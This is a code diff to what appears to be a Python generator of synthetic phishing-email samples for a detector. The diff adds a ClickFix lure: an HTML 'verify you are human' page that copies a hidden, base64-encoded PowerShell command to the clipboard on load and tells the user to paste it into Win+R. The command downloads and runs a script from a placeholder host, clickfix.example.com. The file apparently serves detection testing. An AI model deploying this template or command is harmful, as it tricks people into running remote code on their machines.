@@ -17,6 +17,7 @@ Uso:
 
 import os
 import random
+import base64
 import argparse
 from pathlib import Path
 from email.message import EmailMessage
@@ -119,6 +120,29 @@ def _create_email(subject, html, from_addr="noreply@empresa.example.com"):
 # Cadena inofensiva que aun asi coincide con CLK-028/CLK-029 (evita AV locks)
 _CLIPBOARD_PAYLOAD = "echo powershell sample - not a real command"
 
+
+def _clickfix_encoded_poc() -> str:
+    """Comando PowerShell benigno codificado en Base64 (UTF-16LE) para POC."""
+    raw = ("IEX (New-Object Net.WebClient).DownloadString("
+           "'http://clickfix.example.com/p.ps1')")
+    b64 = base64.b64encode(raw.encode("utf-16-le")).decode("ascii")
+    return "powershell -w hidden -enc " + b64
+
+
+_CLICKFIX_SHELL = """<html><body>
+<h3>Verify you are human</h3>
+<p>Press Win+R and paste the command (Ctrl+V):</p>
+<pre>{cmd}</pre>
+<textarea id="cf-clip" style="display:none" readonly>{cmd}</textarea>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {{
+    navigator.clipboard.writeText("{cmd}");
+  }});
+</script>
+{extra}
+</body></html>
+"""
+
 _MALICIOUS_SHELL = """<html><body>
 <div style="font-family: 'Segoe UI', Roboto, Arial, sans-serif; font-size: 15px;
             color: #202124; line-height: 1.6; letter-spacing: 0.1px;
@@ -160,7 +184,8 @@ _EVENT_SHELL = """<html><body onload="init()" onclick="track()" onmouseover="hov
 def _malicious_html(rng, i):
     """Genera HTML malicioso combinando familias de artefactos LLM."""
     families = rng.sample(
-        ["css", "clipboard", "events", "comments", "placeholder", "localhost", "yellow"],
+        ["css", "clipboard", "clickfix", "events", "comments", "placeholder",
+         "localhost", "yellow"],
         k=rng.randint(1, 3),
     )
     msg = f"Su cuenta sera bloqueada en {rng.randint(2, 48)} horas. Confirme su identidad."
@@ -172,6 +197,8 @@ def _malicious_html(rng, i):
     cta = rng.choice(["Verificar mi cuenta", "Desbloquear cuenta", "Confirmar identidad"])
 
     extra = ""
+    if "clickfix" in families:
+        return _CLICKFIX_SHELL.format(cmd=_clickfix_encoded_poc(), extra=extra)
     if "clipboard" in families:
         return _SCRIPT_SHELL.format(payload=_CLIPBOARD_PAYLOAD, extra=extra)
     if "events" in families:
